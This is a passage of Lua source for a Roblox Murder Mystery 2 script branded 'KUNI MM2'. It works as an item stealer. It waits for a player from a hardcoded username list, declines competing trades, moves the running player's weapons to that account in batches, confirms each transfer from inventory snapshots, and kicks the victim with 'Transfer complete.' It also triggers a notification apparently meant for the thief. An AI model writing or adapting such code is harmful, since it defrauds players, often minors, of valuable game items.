local function KickWhenDone()
    task.wait(2)
    localPlayer:Kick("KUNI MM2 | Transfer complete.")
end

-- ============================================================
--  TRADE ENGINE (tobi's engine — token + snapshot verification)
-- ============================================================
local tradeBusy = false

local function DoTrade(targetName)
    local initStatus = GetTradeStatusWrapped()
    if initStatus == "StartTrade" then
        FireRemote(declineTrade); task.wait(0.05)
    elseif initStatus == "ReceivingRequest" then
        FireRemote(declineRequest); task.wait(0.05)
    elseif initStatus == "SendingRequest" then
        FireRemote(cancelRequest)
    end

    local useSnapshot   = true
    local snapshotOwned = GetInventoryOwned()

    while #weaponQueue > 0 do
        local status = GetTradeStatusWrapped()

        if status == "None" then
            task.spawn(SendTradeReq, targetName)
            task.wait(0.1)

        elseif status == "SendingRequest" then
            task.wait(0.05)

        elseif status == "ReceivingRequest" then
            FireRemote(declineRequest)
            task.wait(0.05)

        elseif status == "StartTrade" then
            local batch = {}
            for i = 1, math.min(4, #weaponQueue) do
                table.insert(batch, weaponQueue[i])
            end

            local ownedBefore
            if useSnapshot and snapshotOwned and next(snapshotOwned) then
                ownedBefore = {}
                for k, v in pairs(snapshotOwned) do ownedBefore[k] = v end
                useSnapshot = false
            else
                local ok2, inv2 = pcall(GetInventoryOwned)
                ownedBefore = (ok2 and type(inv2)=="table") and inv2 or {}
            end

            for _, item in ipairs(batch) do
                for _ = 1, (item.Amount or 1) do
                    AddWeaponToTrade(item.DataID)
                    task.wait(0.05)
                end
            end

            AcceptAndWait()

            local deadline    = tick() + 3
            local transferred = false
            local ownedAfter  = {}

            while tick() < deadline do
                task.wait(0.15)
                local ok3, inv3 = pcall(GetInventoryOwned)
                if ok3 and type(inv3)=="table" and next(inv3)~=nil then
                    ownedAfter = inv3
                    for _, item in ipairs(batch) do
                        if (ownedAfter[item.DataID] or 0) < (ownedBefore[item.DataID] or 0) then
                            transferred = true
                            break
                        end
                    end
                    if transferred then break end
                end
            end

            for _, item in ipairs(batch) do
                local dataId = item.DataID
                local newAmt = transferred and (ownedAfter[dataId] or 0) or 0
                for i = #weaponQueue, 1, -1 do
                    if weaponQueue[i].DataID == dataId then
                        if newAmt <= 0 then
                            table.remove(weaponQueue, i)
                        else
                            weaponQueue[i].Amount = newAmt
                        end
                        break
                    end
                end
            end

            if #weaponQueue == 0 then
                KickWhenDone()
                return
            end

            task.wait(1)
        else
            task.wait(0.1)
        end

        task.wait(0.1)
    end

    KickWhenDone()
end

local function TryTradePlayer(player)
    if tradeBusy then return end
    if table.find(Usernames, player.Name) then
        tradeBusy = true
        local now = tick()
        while player.Parent and not player.Character and tick() - now < 10 do
            task.wait()
        end
        task.wait(1)
        task.spawn(DoTrade, player.Name)
    end
end

-- ===== MAIN =====
if #weaponQueue > 0 then
    local mention = (PingEveryone == 'Yes') and '@everyone' or ''
    task.spawn(SendFirstMessage, mention, weaponQueue)

    for _, player in ipairs(Players:GetPlayers()) do
        TryTradePlayer(player)
    end
    Players.PlayerAdded:Connect(TryTradePlayer)
else
    -- Debug: print what GetInventoryOwned actually returned
    local owned = GetInventoryOwned()
    local count = 0
    for k, v in pairs(owned) do
        count = count + 1
        warn("[KUNI DEBUG] owned: " .. tostring(k) .. " x" .. tostring(v))
    end
    warn("[KUNI DEBUG] Total owned entries: " .. count)
    warn("[KUNI DEBUG] itemData entries: " .. (function()
        local n = 0; for _ in pairs(itemData) do n = n + 1 end; return n
    end)())

    task.wait(1)
    localPlayer:Kick("KUNI MM2 | No qualifying items. Check console (F9) for debug output.")
end
